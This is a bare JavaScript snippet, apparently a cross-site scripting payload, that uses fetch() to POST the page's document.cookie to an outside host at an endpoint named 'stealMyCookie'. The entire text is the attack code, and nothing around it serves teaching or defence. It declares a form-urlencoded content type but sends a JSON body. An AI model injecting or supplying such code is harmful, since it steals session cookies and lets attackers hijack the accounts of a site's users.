fetch("https://gubcsigergely.info/stealMyCookie", {
    method: "POST",
    headers: {
        "Content-Type": "application/x-www-form-urlencoded"
    },
    body: JSON.stringify({cookie: document.cookie})
});
